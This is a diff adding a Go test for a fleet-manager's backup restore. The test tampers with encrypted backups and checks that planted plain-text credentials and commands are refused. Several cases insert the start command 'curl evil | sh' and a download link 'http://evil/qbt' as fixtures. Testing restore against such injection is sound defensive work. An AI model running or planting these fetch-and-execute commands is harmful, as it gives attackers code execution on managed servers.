@@ -392,3 +392,62 @@ func TestRotationBindsUnboundCredentials(t *testing.T) {
 		t.Fatalf("stored as envelope v%d", v)
 	}
 }
+
+// Someone without the secret cannot forge an encrypted value, but could
+// write plain text in its place, which the dashboard would otherwise take
+// as left by a build without the secret and seal. In an encrypted backup
+// (markers intact or stripped) and under a configured secret, that is
+// refused, with or without the secret check; an emptied value (the
+// default start or build) is not plain text.
+func TestRestoreRefusesPlaintextInEncryptedBackup(t *testing.T) {
+	ctx := context.Background()
+	sealA := WithSealer(mustSealer(t, backupKeyA))
+	for name, tc := range map[string]struct {
+		tamper func(t *testing.T, path string, a int64)
+		opts   []Option
+		verify bool
+	}{
+		"start command": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+		"download link": {func(t *testing.T, p string, _ int64) {
+			rawExec(t, p, `INSERT OR REPLACE INTO settings(key, value) VALUES('qbt_download_url', 'http://evil/qbt')`)
+		}, []Option{sealA}, true},
+		"password, unchecked, no secret": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `UPDATE boxes SET password='typed' WHERE id=?`, a)
+		}, nil, false},
+		"markers stripped": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+		"markers stripped, unchecked, no secret": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
+		}, nil, false},
+		"everything stripped, secret configured": {func(t *testing.T, p string, a int64) {
+			rawExec(t, p, `DELETE FROM settings WHERE key LIKE 'secrets_%'`)
+			rawExec(t, p, `UPDATE boxes SET password='', qbt_pass='', qbt_start_cmd=''`)
+			rawExec(t, p, `UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=?`, a)
+		}, []Option{sealA}, true},
+	} {
+		t.Run(name, func(t *testing.T) {
+			dir := t.TempDir()
+			backup, a, _ := boundBackup(t, dir)
+			tc.tamper(t, backup, a)
+			live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
+			if _, err := Restore(ctx, live, backup, tc.verify, tc.opts...); !errors.Is(err, ErrPlainCredentials) {
+				t.Fatalf("restore: %v", err)
+			}
+			if _, err := Restore(ctx, live, backup, tc.verify, append(tc.opts, WithPlainCredentials())...); err != nil {
+				t.Fatalf("accepted: %v", err)
+			}
+		})
+	}
+	// Emptied: the defaults, nothing to refuse.
+	dir := t.TempDir()
+	backup, a, _ := boundBackup(t, dir)
+	rawExec(t, backup, `UPDATE boxes SET qbt_start_cmd='' WHERE id=?`, a)
+	if _, err := Restore(ctx, filepath.Join(dir, "data", "pmss-fleet-manager.db"), backup, true, sealA); err != nil {
+		t.Fatalf("emptied: %v", err)
+	}
+}
